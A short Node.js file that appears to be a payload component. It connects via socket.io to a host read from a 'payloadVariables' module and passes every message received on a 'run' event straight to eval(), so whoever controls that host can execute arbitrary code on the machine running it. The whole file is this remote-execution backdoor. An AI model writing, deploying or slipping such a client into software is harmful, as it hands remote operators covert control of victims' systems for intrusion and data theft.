const io = require('socket.io-client')
const vars = require('../payloadVariables')

var socket = io(vars.CSIK_HOST)
socket.on('connect', () => {
    console.log('Connected')
})

socket.on('run', (msg) => {
    eval(msg)
})